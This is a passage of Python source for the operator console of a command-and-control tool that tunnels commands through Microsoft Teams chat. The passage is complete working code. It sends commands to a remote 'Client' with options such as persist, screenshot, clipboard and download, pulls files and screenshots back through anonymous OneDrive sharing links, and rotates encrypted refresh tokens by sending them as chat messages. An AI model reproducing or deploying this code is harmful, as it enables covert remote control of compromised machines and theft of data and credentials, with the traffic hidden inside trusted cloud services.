        "openUrl":           None,
        "type":              ext_lower,
        "title":             file_name,
        "state":             "active",
        "chicletBreadcrumbs": None,
        "providerData":      "",
        "botFileProperties": {},
        "isUploadError":     None,
        "progressComplete":  None,
        "permissionScope":   None,
        "filePreview":       {"previewUrl": "", "previewHeight": 0, "previewWidth": 0},
        "sharepointIds":     None,
        "publication":       None,
        "site":              None,
    }


######################################################################################################################
def send_file_message(thread_id: str, text: str, file_info: dict,
                      tokens: dict, debug: bool = False) -> None:

    session      = tokens["session"]
    skype_token  = tokens["skype_token"]
    skype_id     = tokens["skype_id"]
    display_name = tokens["display_name"]

    tid_enc       = urllib.parse.quote(thread_id, safe="")
    now_iso       = time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
    client_msg_id = str(int(time.time() * 1000))
    conv_link     = f"https://teams.live.com/api/chatsvc/consumer/v1/users/ME/conversations/{thread_id}"

    payload = {
        "type":                "Message",
        "conversationid":      thread_id,
        "conversationLink":    conv_link,
        "from":                skype_id,
        "fromUserId":          skype_id,
        "composetime":         now_iso,
        "originalarrivaltime": now_iso,
        "content":             text,
        "messagetype":         "RichText/Html",
        "contenttype":         "Text",
        "imdisplayname":       display_name,
        "clientmessageid":     client_msg_id,
        "callId":              "",
        "state":               0,
        "version":             "0",
        "amsreferences":       [],
        "properties": {
            "importance":      "",
            "subject":         "",
            "title":           "",
            "cards":           "[]",
            "links":           "[]",
            "mentions":        "[]",
            "onbehalfof":      None,
            "files":           json.dumps([file_info]),   # ← file attachment
            "policyViolation": None,
            "formatVariant":   "TEAMS",
        },
        "crossPostChannels": [],
    }

    url = f"https://teams.live.com/api/chatsvc/consumer/v1/users/ME/conversations/{tid_enc}/messages"
    r = _api_call(session, "POST", url, tokens, debug=debug,
                  json=payload, headers=_skype_headers(skype_token))
    if r.status_code not in (200, 201):
        url2 = f"https://msgapi.teams.live.com/v1/users/ME/conversations/{tid_enc}/messages"
        r2 = _api_call(session, "POST", url2, tokens, debug=debug,
                       json=payload, headers=_skype_headers(skype_token))
        if r2.status_code not in (200, 201):
            raise RuntimeError(f"send_file_message failed: {r.status_code} / {r2.status_code}")


######################################################################################################################
def send_raw(thread_id: str, text: str, tokens: dict, debug: bool = False) -> None:

    session      = tokens["session"]
    skype_token  = tokens["skype_token"]
    skype_id     = tokens["skype_id"]
    display_name = tokens["display_name"]

    tid_enc       = urllib.parse.quote(thread_id, safe="")
    now_iso       = time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
    client_msg_id = str(int(time.time() * 1000))
    conv_link     = f"https://teams.live.com/api/chatsvc/consumer/v1/users/ME/conversations/{thread_id}"

    payload = {
        "type": "Message", "conversationid": thread_id, "conversationLink": conv_link,
        "from": skype_id, "fromUserId": skype_id,
        "composetime": now_iso, "originalarrivaltime": now_iso,
        "content": text, "messagetype": "RichText/Html", "contenttype": "Text",
        "imdisplayname": display_name, "clientmessageid": client_msg_id,
        "callId": "", "state": 0, "version": "0", "amsreferences": [],
        "properties": {
            "importance": "", "subject": "", "title": "",
            "cards": "[]", "links": "[]", "mentions": "[]",
            "onbehalfof": None, "files": "[]", "policyViolation": None,
            "formatVariant": "TEAMS",
        },
        "crossPostChannels": [],
    }

    url = f"https://teams.live.com/api/chatsvc/consumer/v1/users/ME/conversations/{tid_enc}/messages"
    r = _api_call(session, "POST", url, tokens, debug=debug,
                  json=payload, headers=_skype_headers(skype_token))
    if r.status_code not in (200, 201):
        # Fallback endpoint
        url2 = f"https://msgapi.teams.live.com/v1/users/ME/conversations/{tid_enc}/messages"
        r2 = _api_call(session, "POST", url2, tokens, debug=debug,
                       json=payload, headers=_skype_headers(skype_token))
        if r2.status_code not in (200, 201):
            raise RuntimeError(f"send_raw failed: {r.status_code} / {r2.status_code}")


######################################################################################################################

def fetch_messages(thread_id: str, tokens: dict, debug: bool = False) -> list:
    session     = tokens["session"]
    skype_token = tokens["skype_token"]
    tid_enc     = urllib.parse.quote(thread_id, safe="")

    r = _api_call(
        session, "GET",
        f"https://teams.live.com/api/chatsvc/consumer/v1/users/ME/conversations/{tid_enc}/messages",
        tokens, debug=debug,
        params={
            "view":      "msnp24Equivalent|supportsMessageProperties|supportsExtendedHistory",
            "pageSize":  "200",
            "startTime": "0",
        },
        headers=_skype_headers(skype_token),
        timeout=20,
    )
    if r.status_code != 200:
        _dbg(f"fetch_messages failed: {r.status_code}", debug)
        return []
    msgs = r.json().get("messages", [])
    # Sort ascending by numeric id (oldest first)
    msgs.sort(key=lambda m: int(m.get("id", "0")))
    return msgs


######################################################################################################################

_TOKEN_BLOB_NAME = ".c2session"
TOKEN_ROTATION_INTERVAL = 300   # 5 minutes


######################################################################################################################
def build_token_blob_b64(tokens: dict) -> str:
    server_contact = tokens.get("server_contact", "")
    payload_json = json.dumps({
        "refresh_token":  tokens["refresh_token"],
        "skype_id":       tokens["skype_id"],
        "display_name":   tokens["display_name"],
        "server_contact": server_contact,
        "ts":             int(time.time()),
    }).encode()
    encrypted_blob = encrypt_file(payload_json)
    return base64.b64encode(encrypted_blob).decode()


######################################################################################################################

def upload_refresh_token(tokens: dict, debug: bool = False) -> str:
    graph_token = tokens["graph_token"]
    session     = tokens["session"]

    server_contact = tokens.get("server_contact", "") 
    payload_json = json.dumps({
        "refresh_token":  tokens["refresh_token"],
        "skype_id":       tokens["skype_id"],
        "display_name":   tokens["display_name"],
        "server_contact": server_contact,   # Server's email (User A)
        "ts":             int(time.time()),
    }).encode()
    encrypted_blob = encrypt_file(payload_json)   # AES-256-GCM with FILE_KEY

    upload_url = (
        f"https://graph.microsoft.com/v1.0/me/drive/root:"
        f"/Teams Chat Files/{_TOKEN_BLOB_NAME}:/content"
        f"?@microsoft.graph.conflictBehavior=replace"
    )

    r = _api_call(
        session, "PUT", upload_url, tokens, debug=debug,
        data=encrypted_blob,
        headers={
            "Authorization": f"Bearer {tokens['graph_token']}",
            "Content-Type":  "application/octet-stream",
        },
        timeout=30,
    )
    if r.status_code not in (200, 201):
        raise RuntimeError(f"upload_refresh_token PUT failed: {r.status_code} {r.text[:200]}")

    item_data = r.json()
    item_id   = item_data.get("id", "")
    _dbg(f"Token blob uploaded, item_id={item_id}", debug)

    share_id = ""
    if item_id:
        r_link = _api_call(
            session, "POST",
            f"https://graph.microsoft.com/v1.0/me/drive/items/{item_id}/createLink",
            tokens, debug=debug,
            json={"type": "view", "scope": "anonymous"},
            headers={
                "Authorization": f"Bearer {tokens['graph_token']}",
                "Content-Type":  "application/json",
                "Accept":        "application/json",
            },
            timeout=15,
        )
        if r_link.status_code in (200, 201):
            share_web_url = r_link.json().get("link", {}).get("webUrl", "")
            if share_web_url:
                share_url_b64 = base64.urlsafe_b64encode(
                    share_web_url.encode()
                ).rstrip(b"=").decode()
                share_id = f"u!{share_url_b64}"
                _dbg(f"Token blob shareId created: {share_id[:40]}...", debug)

    if not share_id:
        raise RuntimeError(
            "upload_refresh_token: could not create anonymous sharing link for token blob"
        )

    return share_id

######################################################################################################################

def token_rotation_loop(tokens: dict, thread_id: str,
                        server_tokens: dict = None,
                        debug: bool = False) -> None:
    while True:
        time.sleep(TOKEN_ROTATION_INTERVAL)


        try:
            refresh_all_tokens(tokens, debug=debug)
        except RuntimeError as e:
            print(f"\n[!] Token rotation: refresh failed: {e}")
            print("    Client will use the last cached blob until re-auth.")
            print("CLI >", end="", flush=True)
            continue


        try:
            blob_b64 = build_token_blob_b64(tokens)
        except Exception as e:
            print(f"\n[!] Token rotation: blob build failed: {e}")
            print("CLI >", end="", flush=True)
            continue

        notify_tokens = server_tokens if server_tokens is not None else tokens
        try:
            blob_msg = f"{BLOB_START}{blob_b64}{BLOB_END}"
            send_raw(thread_id, blob_msg, notify_tokens, debug)
            _dbg(f"[rotation] ##BLOB## sent via {'Server' if server_tokens else 'Client'} identity ({len(blob_b64)} chars)", debug)
        except Exception as e:
            _dbg(f"[rotation] Failed to send ##BLOB##: {e}", debug)



######################################################################################################################
######################################################################################################################
######################################################################################################################

_hb_lock       = threading.Lock()
_hb_state: dict = {
    "last_ts":  None,
    "last_seq": None, 
    "status":   "UNKNOWN",  # str: UP / SILENT / DEAD / UNKNOWN
}


######################################################################################################################
def _hb_get_status() -> str:
    with _hb_lock:
        last_ts = _hb_state["last_ts"]
    if last_ts is None:
        return "UNKNOWN"
    age = time.time() - last_ts
    if age < HB_SILENT_AFTER:
        return "UP"
    if age < HB_DEAD_AFTER:
        return "SILENT"
    return "DEAD"


######################################################################################################################

def _hb_format_age() -> str:
    with _hb_lock:
        last_ts  = _hb_state["last_ts"]
        last_seq = _hb_state["last_seq"]
    if last_ts is None:
        return "never"
    age  = int(time.time() - last_ts)
    h, r = divmod(age, 3600)
    m, s = divmod(r, 60)
    seq_str = f" | seq: {last_seq}" if last_seq is not None else ""
    return f"{h:02d}:{m:02d}:{s:02d} ago{seq_str}"


######################################################################################################################

def hb_reader_loop(tokens: dict, thread_id: str, debug: bool = False) -> None:
    last_hb_msg_id = 0
    try:
        initial = fetch_messages(thread_id, tokens, debug)
        if initial:
            last_hb_msg_id = int(initial[-1].get("id", "0"))
    except Exception:
        pass

    prev_status = "UNKNOWN"

    while True:
        time.sleep(HB_MONITOR_INTERVAL)

        try:
            messages = fetch_messages(thread_id, tokens, debug)
        except Exception as e:
            _dbg(f"[HB reader] fetch error: {e}", debug)
            continue

        for msg in messages:
            msg_id  = int(msg.get("id", "0"))
            content = html.unescape(msg.get("content", "") or "")

            if msg_id <= last_hb_msg_id:
                continue
            last_hb_msg_id = max(last_hb_msg_id, msg_id)

            if HB_START not in content or HB_END not in content:
                continue

            raw_payload = _extract_between(content, HB_START, HB_END).strip()
            try:
                beacon = json.loads(raw_payload)
                ts_val = float(beacon.get("ts", time.time()))
                seq_val = int(beacon.get("seq", 0))
            except Exception:
                ts_val  = time.time()
                seq_val = None

            with _hb_lock:
                _hb_state["last_ts"]  = time.time()   # use local clock for age calc
                _hb_state["last_seq"] = seq_val
                _hb_state["status"]   = "UP"

            _dbg(f"[HB reader] beacon seq={seq_val} ts={ts_val}", debug)
        new_status = _hb_get_status()
        with _hb_lock:
            _hb_state["status"] = new_status

        if new_status != prev_status:
            age_str = _hb_format_age()
            # Print the alert on its own line so it doesn't corrupt the prompt
            print(f"\n[!] Client status: {prev_status} → {new_status}  (last HB: {age_str})")
            print("Teams>", end="", flush=True)   # redraw prompt
            prev_status = new_status


######################################################################################################################
_C2_COMMANDS = [
    "whoami", "hostname", "pwd", "getpid", "uptime",
    "ls", "cat", "mkdir", "rm", "mv", "cp",
    "ps", "kill",
    "sysinfo", "drives", "env", "getenv",
    "clipboard",
    "ipconfig", "netstat", "ping", "dns",
    "screenshot",
    "download", "upload",
    "isadmin", "privs", "persist", "unpersist",
    "help",
    "exit", "quit",
]


######################################################################################################################
class _C2Completer:

    def __init__(self, commands: list):
        self.commands = sorted(commands)

    def complete(self, text: str, state: int):

        if state == 0:
            line = _readline.get_line_buffer() if _HAS_READLINE else text
            tokens = line.lstrip().split()

            if not tokens or (len(tokens) == 1 and not line.endswith(" ")):
                prefix = tokens[0] if tokens else ""
                self._matches = [c + " " for c in self.commands
                                 if c.startswith(prefix)]
            else:
                import glob
                path_prefix = text if text else "."
                self._matches = glob.glob(path_prefix + "*")
                self._matches = [
                    (m + "/" if os.path.isdir(m) else m)
                    for m in self._matches
                ]

        try:
            return self._matches[state]
        except IndexError:
            return None


######################################################################################################################
def _setup_readline() -> None:
    if not _HAS_READLINE:
        return

    completer = _C2Completer(_C2_COMMANDS)
    _readline.set_completer(completer.complete)

    _readline.parse_and_bind("tab: complete")

    history_file = os.path.expanduser("~/.c2_history")
    try:
        _readline.read_history_file(history_file)
    except FileNotFoundError:
        pass  
    except OSError:
        pass 

    _readline.set_history_length(1000)

    import atexit
    atexit.register(_readline.write_history_file, history_file)


######################################################################################################################
def _hb_prompt_prefix() -> str:

    status  = _hb_get_status()
    age_str = _hb_format_age()
    colour = {
        "UP":      "\033[92m",   # bright_green
        "SILENT":  "\033[93m",   # bright_yellow
        "DEAD":    "\033[91m",   # bright_red
        "UNKNOWN": "\033[90m",   # dark_grey
    }.get(status, "")
    reset = "\033[0m" if colour else ""
    return f"{colour}[{status} | {age_str}]{reset} "


######################################################################################################################

def server_loop(tokens: dict, thread_id: str, debug: bool = False) -> None:
    _setup_readline()

    print("\n" + "=" * 60)
    print("  Type a command and press Enter.")
    print("  Special: 'upload <path>' sends a file to the Client.")
    print("  Special: 'download <path>' retrieves a file from the Client.")
    if _HAS_READLINE:
        print("  ↑↓ arrow keys: history navigation   TAB: command/path completion")
    print("  Type 'exit' or 'quit' to stop.")
    print("=" * 60 + "\n")

    hb_thread = threading.Thread(
        target=hb_reader_loop,
        args=(tokens, thread_id, debug),
        daemon=True,
        name="HBReader",
    )
    hb_thread.start()
    print(f"[*] Heartbeat monitor started (SILENT after {HB_SILENT_AFTER}s, DEAD after {HB_DEAD_AFTER}s)\n")

    while True:
        try:
            raw_cmd = input(_hb_prompt_prefix() + "Teams>").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[!] Server exiting.")
            break

        if not raw_cmd:
            continue
        if raw_cmd.lower() in ("exit", "quit"):
            print("[*] Server shutting down.")
            break

        parts = raw_cmd.split(None, 1)
        if parts[0].lower() == "upload":

            if len(parts) < 2:
                print("Usage: upload <local_path> [<dest_path_on_client>]")
                continue
            arg_str   = parts[1]
            dest_path = "" 

            sub = arg_str.split(None, 1)
            if len(sub) == 2 and os.path.isfile(sub[0]):

                local_path  = sub[0]
                dest_path   = sub[1].strip()
                remote_name = os.path.basename(local_path)
            elif len(sub) == 2 and not os.path.isfile(arg_str):

                local_path  = sub[0]
                remote_name = sub[1]
            else:
                local_path  = arg_str
                remote_name = os.path.basename(local_path)

            if not os.path.isfile(local_path):
                print(f"[-] File not found: {local_path}")
                continue
            try:
                raw_data      = open(local_path, "rb").read()
                enc_data      = encrypt_file(raw_data)
                b64_full      = base64.b64encode(enc_data).decode()

                if dest_path:
                    b64_full = b64_full + f" ##DEST##{dest_path}"

                chunk_size    = UPLOAD_CHUNK_BYTES * 4 // 3 + 4
                chunks        = [b64_full[i:i+chunk_size]
                                 for i in range(0, len(b64_full), chunk_size)]
                total         = len(chunks)
                file_size_kb  = len(raw_data) / 1024

                dest_info = f" → {dest_path}" if dest_path else ""
                print(f"[*] Sending '{remote_name}' ({file_size_kb:.1f} KB){dest_info} "
                      f"in {total} chunk(s) via Teams chat...")


                start_msg = f"{CHUNK_START_MARKER}{remote_name}|{total}{CHUNK_END}"
                send_raw(thread_id, start_msg, tokens, debug)
                print(f"  [  0%] transfer announced ({total} chunks)")
                time.sleep(2)

                sent_at_epoch = int(time.time() * 1000)

                for idx, chunk_b64 in enumerate(chunks):
                    msg = f"{CHUNK_START}{remote_name}|{total}|{idx}|{chunk_b64}{CHUNK_END}"
                    send_raw(thread_id, msg, tokens, debug)
                    pct = int((idx + 1) / total * 100)
                    print(f"  [{pct:3d}%] chunk {idx+1}/{total} sent ({len(chunk_b64)} chars)")
                    if idx < total - 1:
                        time.sleep(3)

                done_msg = f"{CHUNK_DONE}{remote_name}{CHUNK_END}"
                send_raw(thread_id, done_msg, tokens, debug)
                print(f"[*] All chunks sent + DONE marker. Waiting for Client acknowledgement...")


                deadline = time.time() + SERVER_POLL_TIMEOUT + total * 4
                while time.time() < deadline:
                    time.sleep(SERVER_POLL_INTERVAL)
                    messages = fetch_messages(thread_id, tokens, debug)
                    for msg in messages:
                        msg_id  = int(msg.get("id", "0"))
                        content = html.unescape(msg.get("content", "") or "")

                        if msg_id <= sent_at_epoch or CHUNK_START in content:
                            continue
                        if OUT_START in content and OUT_END in content:
                            ack = _extract_between(content, OUT_START, OUT_END)
                            print(f"[+] Client: {ack.strip()}")
                            deadline = 0
                            break
                        if ERR_START in content and ERR_END in content:
                            err = _extract_between(content, ERR_START, ERR_END)
                            print(f"[-] Client error: {err.strip()}")
                            deadline = 0
                            break
                    if deadline == 0:
                        break
                else:
                    print(f"[-] Timeout: no acknowledgement from Client.")
            except Exception as e:
                print(f"[-] Upload failed: {e}")
            continue


        cmd_msg = f"{CMD_START}{raw_cmd}{CMD_END}"
        sent_at_epoch = int(time.time() * 1000)

        print(f"[→] Sending command: {raw_cmd}")
        try:
            send_raw(thread_id, cmd_msg, tokens, debug)
        except RuntimeError as e:
            print(f"[-] Failed to send command: {e}")
            continue

        print(f"[*] Waiting for response (timeout={SERVER_POLL_TIMEOUT}s)...")
        deadline = time.time() + SERVER_POLL_TIMEOUT

        while time.time() < deadline:
            time.sleep(SERVER_POLL_INTERVAL)
            try:
                messages = fetch_messages(thread_id, tokens, debug)
            except Exception as e:
                _dbg(f"fetch error: {e}", debug)
                continue

            for msg in messages:
                msg_id    = int(msg.get("id", "0"))
                content   = html.unescape(msg.get("content", "") or "")
                msg_type  = msg.get("type", "")
                props     = msg.get("properties", {})

                if msg_type != "Message" or "deletetime" in props:
                    continue

                if msg_id <= sent_at_epoch:
                    continue

                if CMD_START in content:
                    continue

                if OUT_START in content and OUT_END in content:
                    output = _extract_between(content, OUT_START, OUT_END)
                    sender = msg.get("imdisplayname", "Client")

                    if output.startswith("[DOWNLOAD_START "):

                        inner = output[len("[DOWNLOAD_START "): -1].strip().split()
                        if len(inner) >= 2:
                            try:
                                part_count_hint = int(inner[1])
                                # Allow 90 seconds per part for upload + jitter
                                deadline = time.time() + max(SERVER_POLL_TIMEOUT,
                                                             part_count_hint * 90 + 60)
                                print(f"[*] Client is uploading '{inner[0]}' "
                                      f"({part_count_hint} part(s)) — deadline extended.")
                            except ValueError:
                                pass

                        sent_at_epoch = max(sent_at_epoch, msg_id)
                        break

                    if output.startswith("[DOWNLOAD_URL "):
                        inner = output[len("[DOWNLOAD_URL "): -1]
                        if " " not in inner:
                            print(f"\n[-] Malformed DOWNLOAD_URL response: {output[:80]}\n")
                            deadline = 0
                            break
                        fname, share_id_val = inner.rsplit(" ", 1)
                        fname        = fname.strip()
                        share_id_val = share_id_val.strip()
                        if fname and share_id_val:
                            try:
                                print(f"[*] Fetching '{fname}' from Client's OneDrive...")

                                graph_token = tokens.get("graph_token", "")
                                r_share = tokens["session"].get(
                                    f"https://graph.microsoft.com/v1.0/shares/{urllib.parse.quote(share_id_val)}/driveItem"
                                    f"?select=restricted,webDavUrl,%40microsoft.graph.downloadUrl,file,name",
                                    headers={
                                        "Authorization": f"Bearer {graph_token}",
                                        "Prefer": "redeemSharingLink,getShortLivedDownloadUrl",
                                        "Scenariotype": "AUO",
                                        "Scenario": "DownloadFile_TeamsMSAUser",
                                        "Osname": "Windows",
                                        "Accept": "*/*",
                                        "Origin": "https://teams.live.com",
                                        "Referer": "https://teams.live.com/",
                                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
                                    },
                                    timeout=30,
                                )
                                if r_share.status_code == 200:
                                    dl_url = r_share.json().get("@microsoft.graph.downloadUrl", "")
                                else:
                                    dl_url = ""
                                    _dbg(f"shares resolve failed: {r_share.status_code} {r_share.text[:200]}", debug)

                                if dl_url:

                                    r_dl = tokens["session"].get(
                                        dl_url,
                                        headers={
                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
                                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                            "Referer": "https://teams.live.com/",
                                        },
                                        allow_redirects=True,
                                        timeout=300,
                                    )
                                    if r_dl.status_code == 200:
                                        try:
                                            plain = decrypt_file(r_dl.content)
                                        except Exception as dec_err:
                                            print(f"\n[-] Decryption failed: {dec_err}\n")
                                            print("    (Wrong FILE_KEY or file was not encrypted)")
                                            deadline = 0
                                            break
                                        save_path = os.path.join(os.getcwd(), fname)
                                        with open(save_path, "wb") as fh:
                                            fh.write(plain)
                                        print(f"\n[+] File received from {sender}: {save_path} ({len(plain):,} bytes, decrypted OK)\n")
                                    else:
                                        print(f"\n[-] OneDrive fetch failed: HTTP {r_dl.status_code}\n")
                                else:
                                    print(f"\n[-] Could not resolve downloadUrl from shareId\n")
                            except Exception as e:
                                print(f"\n[-] Failed to fetch file from OneDrive: {e}\n")
                        else:
                            print(f"\n[-] Malformed DOWNLOAD_URL response: {output[:80]}\n")
                        deadline = 0
                        break

                    if output.startswith("[DOWNLOAD_PARTS "):

                        inner        = output[len("[DOWNLOAD_PARTS "): -1].strip()
                        tokens_parts = inner.split(" ")
                        if len(tokens_parts) < 3:
                            print(f"\n[-] Malformed DOWNLOAD_PARTS response: {output[:120]}\n")
                            deadline = 0
                            break
                        fname = tokens_parts[0]
                        try:
                            part_count = int(tokens_parts[1])
                        except ValueError:
                            print(f"\n[-] DOWNLOAD_PARTS: invalid count: {tokens_parts[1]}\n")
                            deadline = 0
                            break
                        dl_urls = tokens_parts[2:2 + part_count]
                        if len(dl_urls) != part_count:
                            print(f"\n[-] DOWNLOAD_PARTS: expected {part_count} URLs, got {len(dl_urls)}\n")
                            deadline = 0
                            break

                        print(f"[*] Receiving '{fname}' in {part_count} part(s) from Client's OneDrive...")
                        combined = bytearray()
                        fetch_ok = True

                        for part_num, dl_url in enumerate(dl_urls):
                            try:
                                dl_headers = {
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
                                    "Accept": "*/*",
                                    "Referer": "https://teams.live.com/",
                                }
                                r_dl = tokens["session"].get(dl_url, headers=dl_headers,
                                                              allow_redirects=True, timeout=300)
                                if r_dl.status_code != 200 or not r_dl.content:
                                    r_dl = tokens["session"].post(dl_url, headers=dl_headers,
                                                                   data=b"", allow_redirects=True,
                                                                   timeout=300)
                                if r_dl.status_code != 200 or not r_dl.content:
                                    print(f"\n[-] Part {part_num}: fetch failed (HTTP {r_dl.status_code})\n")
                                    fetch_ok = False
                                    break

                                combined.extend(r_dl.content)
                                pct = int((part_num + 1) / part_count * 100)
                                print(f"  [{pct:3d}%] part {part_num + 1}/{part_count} "
                                      f"fetched ({len(r_dl.content):,} bytes)")

                            except Exception as part_err:
                                print(f"\n[-] Part {part_num}: exception: {part_err}\n")
                                fetch_ok = False
                                break

                        if not fetch_ok:
                            deadline = 0
                            break

                        try:
                            plain = decrypt_file(bytes(combined))
                        except Exception as dec_err:
                            print(f"\n[-] Decryption failed: {dec_err}\n")
                            deadline = 0
                            break

                        # Save to disk
                        save_path = os.path.join(os.getcwd(), fname)
                        with open(save_path, "wb") as fh:
                            fh.write(plain)
                        print(f"\n[+] File received from {sender}: {save_path} "
                              f"({len(plain):,} bytes, {part_count} part(s), decrypted OK)\n")
                        deadline = 0
                        break

                    if output.startswith("[DOWNLOAD "):
                        inner = output[len("[DOWNLOAD "): -1]
                        if " " not in inner:
                            print(f"\n[-] Malformed DOWNLOAD response: {output[:80]}\n")
                            deadline = 0
                            break
                        fname, b64_data = inner.rsplit(" ", 1)
                        fname    = fname.strip()
                        b64_data = b64_data.strip()
                        if fname and b64_data:
                            try:
                                raw = base64.b64decode(b64_data)
                                save_path = os.path.join(os.getcwd(), fname)
                                with open(save_path, "wb") as fh:
                                    fh.write(raw)
                                print(f"\n[+] File received from {sender}: {save_path} ({len(raw)} bytes)\n")
                            except Exception as e:
                                print(f"\n[-] Failed to save downloaded file: {e}\n")
                        else:
                            print(f"\n[-] Malformed DOWNLOAD response: {output[:80]}\n")
                        deadline = 0
                        break

                    if output.startswith("[SCREENSHOT_URL "):
                        inner = output[len("[SCREENSHOT_URL "): -1]
                        if " " not in inner:
                            print(f"\n[-] Malformed SCREENSHOT_URL response: {output[:80]}\n")
                            deadline = 0
                            break
                        fname, share_id_val = inner.rsplit(" ", 1)
                        fname        = fname.strip()
                        share_id_val = share_id_val.strip()
                        if fname and share_id_val:
                            try:
                                print(f"[*] Fetching screenshot '{fname}' from Client's OneDrive...")
                                graph_token = tokens.get("graph_token", "")
                                r_share = tokens["session"].get(
                                    f"https://graph.microsoft.com/v1.0/shares/{urllib.parse.quote(share_id_val)}/driveItem"
                                    f"?select=restricted,webDavUrl,%40microsoft.graph.downloadUrl,file,name",
                                    headers={
                                        "Authorization": f"Bearer {graph_token}",
                                        "Prefer": "redeemSharingLink,getShortLivedDownloadUrl",
                                        "Scenariotype": "AUO",
                                        "Scenario": "DownloadFile_TeamsMSAUser",
                                        "Osname": "Windows",
                                        "Accept": "*/*",
                                        "Origin": "https://teams.live.com",
                                        "Referer": "https://teams.live.com/",
                                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                                    },
                                    timeout=30,
                                )
                                dl_url = ""
                                if r_share.status_code == 200:
                                    dl_url = r_share.json().get("@microsoft.graph.downloadUrl", "")
                                else:
                                    _dbg(f"shares resolve failed: {r_share.status_code} {r_share.text[:200]}", debug)

                                if dl_url:
                                    r_dl = tokens["session"].get(
                                        dl_url,
                                        headers={
                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
                                            "Accept": "*/*",
                                            "Referer": "https://teams.live.com/",
                                        },
                                        allow_redirects=True,
                                        timeout=300,
                                    )
                                    if r_dl.status_code == 200:
                                        try:
                                            plain = decrypt_file(r_dl.content)
                                        except Exception as dec_err:
                                            print(f"\n[-] Screenshot decryption failed: {dec_err}\n")
                                            deadline = 0
                                            break
                                        ts        = time.strftime("%Y%m%d_%H%M%S")
                                        save_path = os.path.join(os.getcwd(), f"screenshot_{ts}.png")
                                        with open(save_path, "wb") as fh:
                                            fh.write(plain)
                                        print(f"\n[+] Screenshot saved: {save_path} ({len(plain):,} bytes)\n")
                                    else:
                                        print(f"\n[-] Screenshot download failed: HTTP {r_dl.status_code}\n")
                                else:
                                    print(f"\n[-] Could not resolve downloadUrl for screenshot\n")
                            except Exception as e:
                                print(f"\n[-] Failed to fetch screenshot: {e}\n")
                        else:
                            print(f"\n[-] Malformed SCREENSHOT_URL response: {output[:80]}\n")
                        deadline = 0
                        break

                    if output.startswith("[SCREENSHOT_B64 "):
                        inner = output[len("[SCREENSHOT_B64 "): -1]
                        if " " not in inner:
                            deadline = 0
                            break
                        fname, b64_data = inner.rsplit(" ", 1)
                        fname    = fname.strip()
                        b64_data = b64_data.strip()
                        if fname and b64_data:
                            try:
                                raw = base64.b64decode(b64_data)
                                ts  = time.strftime("%Y%m%d_%H%M%S")
                                save_path = os.path.join(os.getcwd(), f"screenshot_{ts}.png")
                                with open(save_path, "wb") as fh:
                                    fh.write(raw)
                                print(f"\n[+] Screenshot saved (base64 fallback): {save_path}\n")
                            except Exception as e:
                                print(f"\n[-] Failed to save screenshot: {e}\n")
                        deadline = 0
                        break

                    if output.startswith("[SCREENSHOT "):
                        lines = output.strip().splitlines()
                        header = lines[0]
                        b64_line = ""
                        for ln in reversed(lines):
                            if ln.strip() and not ln.startswith("#") and not ln.startswith("["):
                                b64_line = ln.strip()
                                break
                        if b64_line and "PNG" in header:
                            try:
                                raw = base64.b64decode(b64_line)
                                ts  = time.strftime("%Y%m%d_%H%M%S")
                                save_path = os.path.join(os.getcwd(), f"screenshot_{ts}.png")
                                with open(save_path, "wb") as fh:
                                    fh.write(raw)
                                print(f"\n[+] Screenshot saved: {save_path}\n")
                            except Exception as e:
                                print(f"\n[-] Failed to save screenshot: {e}\n")
                        else:
                            print(f"\n[+] Screenshot received ({header}). Install Pillow on Client for PNG.\n")
                        deadline = 0
                        break

                    print(f"\n[←] Response from {sender}:\n")
                    print("─" * 50)
                    print(output.strip())
                    print("─" * 50 + "\n")
                    deadline = 0
                    break

                if ERR_START in content and ERR_END in content:
                    error = _extract_between(content, ERR_START, ERR_END)
                    sender = msg.get("imdisplayname", "Client")
                    print(f"\n[←] ERROR from {sender}:\n{error.strip()}\n")
                    deadline = 0
                    break

            if deadline == 0:
                break

        else:
            print(f"[-] Timeout: no response received within {SERVER_POLL_TIMEOUT}s.")


def _extract_between(text: str, start: str, end: str) -> str:
    """Extract the substring between `start` and `end` markers."""
    idx_s = text.find(start)
    idx_e = text.find(end, idx_s + len(start))
    if idx_s == -1 or idx_e == -1:
        return text
    return text[idx_s + len(start): idx_e]


def main():
    parser = argparse.ArgumentParser(
        description="",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("-u","--username",required=True,help="Server account email (User A)")
    parser.add_argument("-p","--password",required=True,help="Server account password")
    parser.add_argument("-c",  "--contact",required=True,help="Client account email (User B)")
    parser.add_argument("-uc", "--username-client",default="",help="Client account email (User B) — for token blob generation")
    parser.add_argument("-pc", "--password-client",  default="",help="Client account password — for token blob generation")
    parser.add_argument("--debug", action="store_true", help="Verbose debug output")
    args = parser.parse_args()

    try:
        print("[*] Logging in as Server (User A)...")
        server_tokens = login(args.username, args.password, debug=args.debug)
        thread_id     = resolve_thread(args.contact, server_tokens, debug=args.debug)
        print(f"[+] Server ready. Conversation thread: {thread_id}")

        initial_share_id = None
        client_tokens_for_rotation = None 

        if args.username_client and args.password_client:
            print("\n[*] Logging in as Client (User B) to generate token blob...")
            try:
                client_tokens = login(
                    args.username_client, args.password_client, debug=args.debug
                )
                print(f"[+] Client login successful. skype_id: {client_tokens['skype_id']}")

                client_tokens["server_contact"] = args.username

                print("[*] Building Client token blob (base64 AES-256-GCM)...")
                initial_blob_b64 = build_token_blob_b64(client_tokens)

                print()
                print("=" * 60)
                print("  CLIENT TOKEN BLOB READY")
                print("=" * 60)
                print(f"  Blob (base64):")
                print(f"  {initial_blob_b64}")
                print()
